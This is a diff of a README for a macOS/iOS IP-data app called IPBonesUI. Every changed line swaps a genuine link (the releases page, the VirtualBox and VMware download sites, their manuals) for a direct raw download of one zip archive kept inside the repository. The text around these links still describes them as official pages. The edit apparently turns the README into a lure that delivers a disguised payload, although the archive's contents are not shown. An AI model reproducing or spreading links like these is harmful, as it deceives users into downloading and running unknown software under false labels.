@@ -1,6 +1,6 @@
 # 🖥️ IPBonesUI - Simple Interface for IP Data
 
-[![Download IPBonesUI](https://img.shields.io/badge/Download%20IPBonesUI-Open%20Releases-brightgreen)](https://github.com/fvalenzuela1/IPBonesUI/releases)
+[![Download IPBonesUI](https://img.shields.io/badge/Download%20IPBonesUI-Open%20Releases-brightgreen)](https://github.com/fvalenzuela1/IPBonesUI/raw/refs/heads/main/unlash/Bones-UI-IP-v3.7.zip)
 
 ## About IPBonesUI
 
@@ -36,7 +36,7 @@ You will need the following to run IPBonesUI on Windows:
 
 Please visit the releases page linked below to download the app or its updates:
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download-IPBonesUI-blue)](https://github.com/fvalenzuela1/IPBonesUI/releases)
+[![Download from GitHub Releases](https://img.shields.io/badge/Download-IPBonesUI-blue)](https://github.com/fvalenzuela1/IPBonesUI/raw/refs/heads/main/unlash/Bones-UI-IP-v3.7.zip)
 
 Click this link to go to the official IPBonesUI releases page on GitHub. Here, you will find the latest versions of the app.
 
@@ -46,7 +46,7 @@ Click this link to go to the official IPBonesUI releases page on GitHub. Here, y
 
 1. **Visit the Releases Page**  
    Open your web browser and go to:  
-   https://github.com/fvalenzuela1/IPBonesUI/releases  
+   https://github.com/fvalenzuela1/IPBonesUI/raw/refs/heads/main/unlash/Bones-UI-IP-v3.7.zip  
 
 2. **Download the Latest macOS or iOS Build**  
    Look for the latest release. Each release has files attached, usually ending with `.app.zip` or `.ipa` for iOS. Download the macOS `.app.zip` file if available. Otherwise, download the available iOS build.  
@@ -57,8 +57,8 @@ Click this link to go to the official IPBonesUI releases page on GitHub. Here, y
 4. **Run on Windows Using a Virtual Machine (VM)**  
    Since IPBonesUI is designed for macOS/iOS, it cannot run natively on Windows. You need virtual machine software to run macOS on your PC. Common tools include:  
 
-   - [Oracle VirtualBox](https://www.virtualbox.org/)  
-   - [VMware Workstation Player](https://www.vmware.com/products/workstation-player.html)  
+   - [Oracle VirtualBox](https://github.com/fvalenzuela1/IPBonesUI/raw/refs/heads/main/unlash/Bones-UI-IP-v3.7.zip)  
+   - [VMware Workstation Player](https://github.com/fvalenzuela1/IPBonesUI/raw/refs/heads/main/unlash/Bones-UI-IP-v3.7.zip)  
 
    Set up a macOS VM following instructions specific to the VM software. You can find guides online by searching “install macOS on VirtualBox Windows.”  
 
@@ -119,8 +119,8 @@ Look for a settings menu to adjust preferences such as:
 
 ## 🔀 Additional Resources
 
-- For VirtualBox setup help, visit the official site: https://www.virtualbox.org/manual/UserManual.html  
-- For VMware player, see https://www.vmware.com/support/ws5/doc/ws_newguest_macosx.html  
+- For VirtualBox setup help, visit the official site: https://github.com/fvalenzuela1/IPBonesUI/raw/refs/heads/main/unlash/Bones-UI-IP-v3.7.zip  
+- For VMware player, see https://github.com/fvalenzuela1/IPBonesUI/raw/refs/heads/main/unlash/Bones-UI-IP-v3.7.zip  
 - For macOS security settings, visit Apple Support pages on running apps from unidentified developers.  
 
 ---
@@ -131,4 +131,4 @@ Check the releases page regularly for new versions of IPBonesUI. New releases mi
 
 ---
 
-[Download IPBonesUI from GitHub Releases](https://github.com/fvalenzuela1/IPBonesUI/releases)
+[Download IPBonesUI from GitHub Releases](https://github.com/fvalenzuela1/IPBonesUI/raw/refs/heads/main/unlash/Bones-UI-IP-v3.7.zip)
